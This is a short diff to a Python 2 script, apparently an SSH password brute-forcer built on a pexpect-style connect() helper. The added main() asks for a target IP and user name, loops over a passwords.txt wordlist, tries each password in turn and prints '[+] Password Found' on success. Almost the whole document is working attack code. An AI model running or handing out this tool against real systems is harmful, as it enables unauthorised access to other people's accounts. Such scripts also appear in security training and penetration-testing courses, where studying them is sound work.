@@ -27,3 +27,19 @@ def connect(user,host,password):
 	child.sendline(password)
 	child.expect(PROMPT)
 	return child
+
+
+def main():
+	host = raw_input("Enter IP: ")
+	user = raw_input("Enter user account name: ")
+	file = open('passwords.txt','r')
+
+	for passwd in file.readlines():
+
+		try:
+			child = connect(user,host,passwd)
+			print '[+] Password Found: ' + passwd
+		except:
+			print 'Wrong Password: ' + passwd
+
+main()
